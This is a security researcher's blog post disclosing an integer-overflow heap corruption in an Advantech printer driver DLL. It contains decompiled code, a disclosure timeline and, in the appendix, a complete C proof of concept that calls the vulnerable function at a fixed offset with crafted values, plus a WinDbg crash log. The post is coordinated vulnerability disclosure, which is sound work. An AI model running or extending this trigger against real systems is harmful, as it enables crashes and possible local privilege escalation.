---
layout: post
category: Security
title: "Advantech printer driver: heap corruption via Monochrome blit function (DrvRender_x64_ADVANTECH.dll)"
heading: "Advantech printer driver: heap corruption via Monochrome blit function (DrvRender_x64_ADVANTECH.dll)"
description: "Heap corruption in the Advantech TP-3250 printer driver due to 32-bit size arithmetic and unvalidated geometry in a CopyBits-style routine; reliable crash and likely local Privilege Escalation."
---


## TLDR:

- The driver’s “monochrome blit” pipeline (8bpp → 1bpp), reachable via a DRVFN
entry in DrvRender_x64_ADVANTECH.dll, works out the 1-bpp buffer size with
32-bit arithmetic and then writes height*stride bytes into it.

- With attacker controlled surface geometry (width/height) plus a lax
“count/length” field, the driver allocates too little memory and smashes the
heap.

- The result is a reliable heap corruption crash (`0xC0000374`) and highly likely
path to privilege escalation with some extra work

- No spooler access is required to trigger the bug; a local process that loads
the DLL can reach the path.

- The trigger for this bug does not require any admin or spooler access, all that
is needed is access to the dll.

- Driver can be found here: [Advantech URP-PT802/PT803 Driver Download](https://www.advantech.com/emt/support/details/driver?id=1-2LFJBRQ) this uses the same TP 3250 driver under the hood. 


## Background:

After poking around and finding the bug in the last blog post in the DrvUI dll ([previous post]({{ site.baseurl }}{% post_url 2025-10-08-Heap-Corruption-in-Advantech-TP-3250-Printer-Driver %})),
I chose to look at some of the other dlls installed with these drivers :)

One of those dlls was the `DrvRender_x64_ADVANTECH.dll` the fun thing here is
that this dll exposes a load of different functions that can be called from an
external program, one of which looked interesting as it had a tonne of
different arithmetic. This turned out to be fruitful as there were some 32bit
-> 64bit conversions which is never a good idea.


## Test Env:

- Virtual box running Microsoft Windows 10 build 19041 x64
- Clean VM with only Windgb, Vbox additions, and the driver installed.
- A remote path to my host machine to move exes and other files around.

## Repro:

1. Compile the `ex.c` file in the appendix, eg: `x86_64-w64-mingw32-gcc ex.c -o ex.exe -lwinspool`

2. Enable crash dumps on the windows system. See previous post to see how

3. Install the driver from the link above (in TLDR)

4. Run the compiled code and view the `ex.exe.N` file in `C:\Dumps\` or
   wherever you set you dumps to go. Another option is to run
   `gflags /p /enable ex.exe /full` and then run the exe inside of WinDbg

### The Bug

#### From DLL to DRVFN table

So, one of the main things I leant in this process was that of the DRVFN table.
For those unfamiliar with Windows driver architecture, the DRVFN (Driver
Function) table is a dispatch table that printer drivers use to
tell Windows which functions they support. When a driver's DrvEnableDriver
function is called, it returns this table containing function indices (like
0x13 for DrvCopyBits) paired with pointers to the actual implementation
functions. Think of it as the driver saying "here is what I can do, and where
you can find it" Windows then uses these function pointers to call into the
driver when it needs to do things with the driver.

One of the functions that was exported in the DLL was `DrvEnableDriver(uint
param_1,uint param_2,undefined4 *param_3)` This was a major give away to the
DRVFN table's structure (Note that in this snippit, I have already renamed the
DAT to DRVFN64_ARRAY_180005f50, since I have converted it):

```c
undefined8 DrvEnableDriver(uint param_1,uint param_2,undefined4 *param_3)

{
  DWORD dwErrCode;

                    /* 0x10e44  3  DrvEnableDriver */
  if (param_1 < 0x20000) {
    dwErrCode = 0x77;
  }
  else {
    if (0xf < param_2) {
      *param_3 = 0x20000;
      param_3[1] = 0x16;
      *(DRVFN64 **)(param_3 + 2) = DRVFN64_ARRAY_180005f50;
      return 1;
    }
    dwErrCode = 0x57;
  }
  SetLastError(dwErrCode);
  return 0;
}
```

What this tells us is that there is a structure at the location of 180005f50 that takes the from:

`param_3[1] = 0x16;` tells us that the length of the array is 22. Also Windows
defines DRVFN as `{ULONG iFunc; PFN pfn; }` on x64, a pad is inserted between
the 4-byte iFunc and the 8-byte pointer, so each element is 16 bytes:

![An image showing the Structure Editior with the DRVFN structure](/assets/images/drvfn.png)

Now this can be applied to the structure at 180005f50 and we know there are 22 elements.

This will point us to the functions that we can use from the dll. Today we are looking at the 10th element or:

```
          180005ff0 13 00 00 00 00  DRVFN64                           [10]
                    00 00 00 54 55
                    01 80 01 00 00
             180005ff0 13 00 00 00     uint32_t  13h                     iFunc
             180005ff4 00 00 00 00     uint32_t  0h                      pad
             180005ff8 54 55 01 80 01  UINT64    180015554h              pfn
                       00 00 00
```

`DrvEnableDriver → DRVFN[] → [iFunc=0x13] → RVA 0x15554`

#### Call Path

The vulnerable call path that we are exploiting here is in that function at 15554:
```
0x15554 (wrapper)
    0x177B8  (8-bpp plane builder)   ← can under-allocate
    0x1817C  (1-bpp allocator)       ← can under-allocate
        0x21C08  (1-bpp packer)          ← overflow sink
            → EngCreateBitmap → EngAssociateSurface → EngCopyBits
```

#### Vulnerable code

Okay so now lets have a look at these functions:

```c

ulonglong FUN_180015554(longlong param_1,longlong param_2,undefined8 param_3,longlong param_4,
                       uint *param_5,uint *param_6)

{
  ...
  if ((((param_2 == 0) || (param_4 == 0)) || (param_5 == (uint *)0x0)) ||
     (*(int *)(lVar5 + 0x128) == 1)) {
    ...
  }
  else {
    local_438 = 0;
    memset(local_434,0,0x3fc);
    uVar3 = *(uint *)(param_2 + 0x24);
    uStack_454 = 0;
    local_458 = 0;
    local_res8 = (void *)CONCAT44(local_res8._4_4_,*(undefined4 *)(param_2 + 0x20));
    local_res10 = uVar3;
    iVar2 = XLATEOBJ_cGetPalette(param_4,1,*(undefined4 *)(param_4 + 0xc),&local_438);
    uVar1 = (uint)local_res8;
    local_res8 = (void *)FUN_1800177b8(*(longlong *)(param_2 + 0x30),*(uint *)(param_2 + 0x28),
                                       (longlong)&local_438,iVar2,*(int *)(param_2 + 0x48),
                                       (uint)local_res8,uVar3,*(float *)(lVar5 + 300),
                                       *(float *)(lVar5 + 0x130));
    if (local_res8 == (void *)0x0) {
      uVar6 = 0;
    }
    else {
      _Memory = FUN_18001817c((longlong)local_res8,(ulonglong)((uVar1 + 3 >> 2) * uVar3 * 4),uVar1,
                              uVar3,*(int *)(lVar5 + 0x128));
      if (_Memory != (byte *)0x0) {
        uStack_454 = local_res10;
        local_458 = uVar1;
        lVar4 = EngCreateBitmap(CONCAT44(local_res10,uVar1),(uVar1 + 0x1f & 0xffffffe0) >> 3,1,2,
                                _Memory);
        if (lVar4 != 0) {
          iVar2 = EngAssociateSurface(lVar4,*(undefined8 *)(lVar5 + 8),0);
          if (iVar2 != 0) {
            lVar5 = EngLockSurface(lVar4);
            if (lVar5 != 0) {
              uVar3 = EngCopyBits(param_1,lVar5,param_3,0,param_5,param_6);
              uVar6 = (ulonglong)uVar3;
              EngUnlockSurface(lVar5);
            }
          }
          EngDeleteSurface(lVar4);
        }
        free(_Memory);
      }
      free(local_res8);
    }
  }
  return uVar6;
}
```

The whole purpose of this function is to wrap around all the other functions
that we call, this takes a lot of params that I have figured out from the rest
of the code are:

```
(PVOID)ctx,       // psoTrg (destination surface)
(PVOID)surf1,     // psoSrc (source surface)
NULL,             // pco null for no clipping..
(PVOID)surf2,     // pxlo (color translation - must be non-NULL)
&dst_rect,        // prclTrg (destination rectangle)
&src_point        // pptlSrc
```
In our PoC the params mean that this if statement is false: `if ((((param_2 == 0) || (param_4 == 0)) || (param_5 == (uint *)0x0)) || (*(int *)(lVar5 + 0x128) == 1))`
So we hit the path that then calls FUN_1800177b8 which is where the fun happens, well in the inner calls is where the fun is:

```c

void FUN_1800177b8(longlong param_1,uint param_2,longlong param_3,int param_4,int param_5,
                  int param_6,uint param_7,float param_8,float param_9)

{
  uVar8 = ((int)((param_6 + 3 >> 0x1f & 3U) + param_6 + 3) >> 2) * 4;
  ...
  _Dst = malloc((ulonglong)(uVar8 * param_7));
  if (_Dst != (void *)0x0) {
    memset(_Dst,0xff,(ulonglong)(uVar8 * param_7));
    // ... pack pixels into 1-bpp, advancing one row by uVar8 each iteration this is just a bunch of if / elif
  FUN_180023520(local_68 ^ (ulonglong)auStack_198);
  return;
}
```

Now, sure most of this function has been removed, but it is those first two
lines in this snippet that are the real clincher here. That `uVar8 * param_7`
is where we are doing the product of 2 32bit vars and then widened to 64bit,
this carrys the risk of under allocation. The multiplication overflows in
32-bit space before being widened to 64-bit.Example: `0x10000 * 0x10000 =
0x100000000`, but in 32 bit = `0x0` That undersized buffer is then initialized here:
`memset(_Dst,0xff,(ulonglong)(uVar8 * param_7));`

Now that we have that initalized we can move back to the wrapper function were `FUN_18001817c` is called

```c
byte * FUN_18001817c(longlong param_1,undefined8 param_2,int param_3,uint param_4,int param_5)

{
  uint uVar1;
  byte *_Dst;
  size_t _Size;
  undefined4 in_stack_ffffffffffffffc4;
  undefined4 in_stack_ffffffffffffffcc;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;

  uVar1 = param_3 + 0x1f + (param_3 + 0x1f >> 0x1f & 0x1fU);
  _Size = (size_t)(int)(((int)((uVar1 & 0xffffffe0) + ((int)uVar1 >> 0x1f & 7U)) >> 3) * param_4);
  _Dst = (byte *)malloc(_Size);
  if (_Dst != (byte *)0x0) {
    memset(_Dst,0,_Size);
    if (param_5 == 2) {
      FUN_1800212a8(param_1,param_3,param_4,_Dst);
    }
    else if (param_5 == 3) {
      FUN_1800215d8(param_1,param_3,param_4,_Dst);
    }
    else if (param_5 == 4) {
      local_28 = 0;
      local_24 = 0;
      local_14 = 0;
      local_1c = 1;
      local_18 = 1;
      local_20 = 2;
      FUN_180021908(param_1,param_3,param_4,(longlong)_Dst,(longlong)&local_28,
                    CONCAT44(in_stack_ffffffffffffffc4,2),CONCAT44(in_stack_ffffffffffffffcc,3),4.0)
      ;
    }
    else {
      FUN_180021c08(param_1,param_3,param_4,_Dst);
    }
  }
  return _Dst;
}

```


This function receives the undersized buffer from `FUN_1800177b8` as `param_1`,
but calculates its own buffer size using a different formula. It then allocates
`_Dst` and calls `FUN_180021c08` (the overflow sink from our call path).

```c

void FUN_180021c08(longlong param_1,int param_2,uint param_3,byte *param_4)

{
  uint uVar1;
  longlong lVar2;
  ulonglong uVar3;
  int iVar4;
  int iVar5;
  byte *pbVar6;

  uVar1 = param_2 + 0x1f + (param_2 + 0x1f >> 0x1f & 0x1fU);
  if (0 < (int)param_3) {
    lVar2 = 0;
    uVar3 = (ulonglong)param_3;
    do {
      iVar5 = 0;
      pbVar6 = param_4;
      if (0 < param_2) {
        do {
          *pbVar6 = *pbVar6 | -(0x7f < *(byte *)(iVar5 + lVar2 + param_1)) & 0x80U;
          *pbVar6 = *pbVar6 | -(0x7f < *(byte *)((iVar5 + 1) + lVar2 + param_1)) & 0x40U;
          *pbVar6 = *pbVar6 | -(0x7f < *(byte *)((iVar5 + 2) + lVar2 + param_1)) & 0x20U;
          *pbVar6 = *pbVar6 | -(0x7f < *(byte *)((iVar5 + 3) + lVar2 + param_1)) & 0x10U;
          *pbVar6 = *pbVar6 | -(0x7f < *(byte *)((iVar5 + 4) + lVar2 + param_1)) & 8U;
          *pbVar6 = *pbVar6 | -(0x7f < *(byte *)((iVar5 + 5) + lVar2 + param_1)) & 4U;
          iVar4 = iVar5 + 7;
          *pbVar6 = *pbVar6 | -(0x7f < *(byte *)((iVar5 + 6) + lVar2 + param_1)) & 2U;
          iVar5 = iVar5 + 8;
          *pbVar6 = *pbVar6 | 0x7f < *(byte *)(iVar4 + lVar2 + param_1);
          pbVar6 = pbVar6 + 1;
        } while (iVar5 < param_2);
      }
      param_4 = param_4 + ((int)((uVar1 & 0xffffffe0) + ((int)uVar1 >> 0x1f & 7U)) >> 3);
      lVar2 = lVar2 + (((int)((param_2 + 3 >> 0x1f & 3U) + param_2 + 3) >> 2) << 2);
      uVar3 = uVar3 - 1;
    } while (uVar3 != 0);
  }
  return;
}
```

The vulnerability chain is:
1. `FUN_1800177b8` allocates buffer using `uVar8 * param_7` (32-bit overflow → too small)
2. `FUN_18001817c` receives this buffer and calculates a CORRECT size for the output
3. `FUN_180021c08` reads from the undersized input buffer and writes to the output
4. When the packer function tries to read height × stride bytes from the undersized
   source buffer, it reads beyond the allocation → heap corruption

### Impact

This vulnerability represents a serious local privilege escalation risk for systems with the Advantech TP-3250 printer driver installed. The key impacts include:

**Heap Corruption and Code Execution**

The 32 bit integer overflow leads to a controllable heap corruption condition.
An attacker who can trigger this bug gains the ability to corrupt heap metadata
and adjacent allocations. With smarter techniques than what I have done this
corruption can be leveraged to achieve arbitrary code execution.

**Low user level rights needed**

Unlike many printer driver vulnerabilities, this bug does not require:
- Admin privileges
- Print spooler service access
- Network connectivity
- User interaction

Any local user with the ability to load the `DrvRender_x64_ADVANTECH.dll`
library can trigger this vulnerability. The attack surface is significantly
larger than typical spooler-based printer exploits. This is also widened since
the dll is also placed in the path: `C://Advantech/`

**Privilege Escalation Vector**

Because printer drivers on Windows often run with elevated privileges or in security-sensitive contexts, successful exploitation could allow:
- A low-privileged user to gain SYSTEM privileges
- Escape from application sandboxes
- Bypass security boundaries in enterprise environments


## Timeline

- Tue, Jul 29 2025: Bug discovered and reported to NCSC
- Fri, Aug 1 2025: Response from NCSC
- Wed, Aug 13 2025: NCSC reported bug to vendor
- Mon, Oct 6 2025: NCSC informed me that the disclosure period has ended and I am free to post about this.


## Appendix:

### A - POC

```c
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

typedef ULONG (__stdcall *PFN_DrvCopyBits_t)(
    PVOID psoTrg,
    PVOID psoSrc,
    PVOID pco,
    PVOID pxlo,
    PRECTL prclTrg,
    PPOINTL pptlSrc
);

int main() {
    const char *dll_path = "DrvRender_x64_ADVANTECH.dll";
    DWORD rva = 0x15554; // func offset within dll got this from the drvfn table.

    // Load the DLL
    HMODULE base = LoadLibraryA(dll_path);
    if (!base) {
        fprintf(stderr, "Oh NO! LoadLibraryA failed (%lu)\n", GetLastError());
        return 1;
    }

    // Calculate function address
    PFN_DrvCopyBits_t PFN_DrvCopyBits = (PFN_DrvCopyBits_t)((BYTE *)base + rva);
    printf("dll loaded at %p, 'PFN_DrvCopyBits' at %p\n", base, PFN_DrvCopyBits);

    // structures needed
    uint8_t *ctx    = (uint8_t *)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    uint8_t *inner  = (uint8_t *)VirtualAlloc(NULL, 0x200,  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    uint8_t *surf1  = (uint8_t *)VirtualAlloc(NULL, 0x100,  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    uint8_t *surf2  = (uint8_t *)VirtualAlloc(NULL, 0x100,  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Larger pixel buffer to potentially avoid AV detection
    uint8_t *pixels = (uint8_t *)VirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Check allocations
    if (!ctx || !inner || !surf1 || !surf2 || !pixels) {
        fprintf(stderr, "NO!!!! Memory allocation failed\n");
        goto cleanup;
    }

    // Initialize with patterns for debugging
    memset(ctx,    0x41, 0x1000);
    memset(inner,  0x42, 0x200);
    memset(surf1,  0x43, 0x100);
    memset(surf2,  0x44, 0x100);
    memset(pixels, 0x45, 0x10000);

    // initialise context structure fields
    *(uint64_t *)(ctx + 0x10) = (uint64_t)inner;

    *(int *)(inner + 0x128) = 0;

    *(uint64_t *)(ctx + 0x30) = 0;
    *(uint64_t *)(ctx + 0x38) = 0;
    *(uint64_t *)(ctx + 0x438) = 0;

    memset(surf2, 0, 0x10);

    // Set up surface structure to trigger overflow condition
    uint32_t width  = 0x40000000;  // Large width for overflow
    uint32_t height = 8;

    *(uint32_t *)(surf1 + 0x20) = width;
    *(uint32_t *)(surf1 + 0x24) = height;
    *(uint32_t *)(surf1 + 0x28) = 0xFFFFFFFF; // Large count value
    *(uint64_t *)(surf1 + 0x30) = (uint64_t)pixels;
    *(uint32_t *)(surf1 + 0x48) = 1;

    RECTL dst_rect = {0, 0, 64, 64};
    POINTL src_point = {0, 0};

    printf("[*] Triggering pixel transform with width=0x%x height=0x%x (may overflow)\n", width, height);
    printf("[*] Calling PFN_DrvCopyBits...\n");

    ULONG result = PFN_DrvCopyBits(
        (PVOID)ctx,       // psoTrg (destination surface)
        (PVOID)surf1,     // psoSrc (source surface)
        NULL,             // pco null for no clipping..
        (PVOID)surf2,     // pxlo (color translation - must be non-NULL)
        &dst_rect,        // prclTrg (destination rectangle)
        &src_point        // pptlSrc
    );

    printf("[+] PFN_DrvCopyBits returned: 0x%lu\n", result);

cleanup:
    // release all the allocations
    if (ctx)    VirtualFree(ctx,    0, MEM_RELEASE);
    if (inner)  VirtualFree(inner,  0, MEM_RELEASE);
    if (surf1)  VirtualFree(surf1,  0, MEM_RELEASE);
    if (surf2)  VirtualFree(surf2,  0, MEM_RELEASE);
    if (pixels) VirtualFree(pixels, 0, MEM_RELEASE);
    if (base) FreeLibrary(base);

    return 0;
}
```

### B - WinDbg output

```
0:000> !analyze -v
..................
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************


KEY_VALUES_STRING: 1

    Key  : AV.Type
    Value: Write

    Key  : Analysis.CPU.mSec
    Value: 718

    Key  : Analysis.Elapsed.mSec
    Value: 14452

    Key  : Analysis.IO.Other.Mb
    Value: 0

    Key  : Analysis.IO.Read.Mb
    Value: 1

    Key  : Analysis.IO.Write.Mb
    Value: 4

    Key  : Analysis.Init.CPU.mSec
    Value: 796

    Key  : Analysis.Init.Elapsed.mSec
    Value: 19788

    Key  : Analysis.Memory.CommitPeak.Mb
    Value: 86

    Key  : Analysis.Version.DbgEng
    Value: 10.0.27871.1001

    Key  : Analysis.Version.Description
    Value: 10.2505.01.02 amd64fre

    Key  : Analysis.Version.Ext
    Value: 1.2505.1.2

    Key  : Failure.Bucket
    Value: INVALID_POINTER_WRITE_AVRF_c0000005_DrvRender_x64_ADVANTECH.dll!Unknown

    Key  : Failure.Exception.Code
    Value: 0xc0000005

    Key  : Failure.Exception.IP.Address
    Value: 0x7ffd5c547a00

    Key  : Failure.Exception.IP.Module
    Value: DrvRender_x64_ADVANTECH

    Key  : Failure.Exception.IP.Offset
    Value: 0x17a00

    Key  : Failure.Hash
    Value: {28021f10-bbf5-db82-dbf6-c0ff68f801c3}

    Key  : Failure.ProblemClass.Primary
    Value: INVALID_POINTER_WRITE

    Key  : Timeline.OS.Boot.DeltaSec
    Value: 37991

    Key  : Timeline.Process.Start.DeltaSec
    Value: 2

    Key  : WER.OS.Branch
    Value: vb_release

    Key  : WER.OS.Version
    Value: 10.0.19041.1


FILE_IN_CAB:  ex.exe.2676.dmp

NTGLOBALFLAG:  2200000

APPLICATION_VERIFIER_FLAGS:  0

APPLICATION_VERIFIER_LOADED: 1

CONTEXT:  (.ecxr)
rax=0000000000000000 rbx=000001c5b6964ff0 rcx=0000000000000010
rdx=0000000000000000 rsi=0000000040000000 rdi=0000000000000011
rip=00007ffd5c547a00 rsp=0000006174dff620 rbp=0000000000000045
 r8=0000000000000000  r9=0000000000000000 r10=0000000000000002
r11=000000001fffffff r12=000000003fffffff r13=00000000ffffffff
r14=000001c5b5620000 r15=0000000000000001
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
DrvRender_x64_ADVANTECH!DrvEnableDriver+0x6bbc:
00007ffd`5c547a00 880419          mov     byte ptr [rcx+rbx],al ds:000001c5`b6965000=??
Resetting default scope

EXCEPTION_RECORD:  (.exr -1)
ExceptionAddress: 00007ffd5c547a00 (DrvRender_x64_ADVANTECH!DrvEnableDriver+0x0000000000006bbc)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 0000000000000001
   Parameter[1]: 000001c5b6965000
Attempt to write to address 000001c5b6965000

PROCESS_NAME:  ex.exe

WRITE_ADDRESS:  000001c5b6965000

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.

EXCEPTION_CODE_STR:  c0000005

EXCEPTION_PARAMETER1:  0000000000000001

EXCEPTION_PARAMETER2:  000001c5b6965000

STACK_TEXT:
00000061`74dff620 00007ffd`5c545651     : 00000000`00000000 00000061`74dffcc0 000001c5`b55e0000 00007ffd`71a8cd51 : DrvRender_x64_ADVANTECH!DrvEnableDriver+0x6bbc
00000061`74dff7c0 00007ff6`73dd1863     : 00007ff6`40000000 00000000`00000008 00000000`00000008 00000061`74dfdf70 : DrvRender_x64_ADVANTECH!DrvEnableDriver+0x480d
00000061`74dffc80 00007ff6`73dd1307     : 00000000`00000000 00000000`00000014 00007ff6`73ddc048 00000000`00000000 : ex+0x1863
00000061`74dffd50 00007ff6`73dd142a     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ex!__tmainCRTStartup+0x177
00000061`74dffdb0 00007ffd`71267374     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ex!mainCRTStartup+0x1a
00000061`74dffde0 00007ffd`71a7cc91     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : kernel32!BaseThreadInitThunk+0x14
00000061`74dffe10 00000000`00000000     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21


STACK_COMMAND: ~0s; .ecxr ; kb

SYMBOL_NAME:  DrvRender_x64_ADVANTECH+6bbc

MODULE_NAME: DrvRender_x64_ADVANTECH

IMAGE_NAME:  DrvRender_x64_ADVANTECH.dll

BUCKET_ID_MODPRIVATE: 1

FAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_AVRF_c0000005_DrvRender_x64_ADVANTECH.dll!Unknown

OS_VERSION:  10.0.19041.1

BUILDLAB_STR:  vb_release

OSPLATFORM_TYPE:  x64

OSNAME:  Windows 10

IMAGE_VERSION:  0.3.9600.17336

FAILURE_ID_HASH:  {28021f10-bbf5-db82-dbf6-c0ff68f801c3}

Followup:     MachineOwner
---------
```

## Relevant Resources:


- [Advantech URP-PT802/PT803 Driver Download](https://www.advantech.com/emt/support/details/driver?id=1-2LFJBRQ) Official driver package containing the vulnerable DLL
- [Microsoft DRVFN Documentation](https://docs.microsoft.com/en-us/windows/win32/api/winddi/ns-winddi-drvenabledata) Official documentation on the DRVENABLEDATA structure and DRVFN table
- [CWE-190: Integer Overflow or Wraparound](https://cwe.mitre.org/data/definitions/190.html) The vulnerability class this bug belongs to I think
- [Ghidra](https://ghidra-sre.org/) The reverse engineering tool I used for analysis
- [WinDbg Documentation](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/) Windows debugger used for crash analysis
- [NCSC Vulnerability Disclosure Policy](https://www.ncsc.govt.nz/report/how-to-report-a-vulnerability/coordinated-vulnerability-disclosure-policy/) Coordinated disclosure process followed

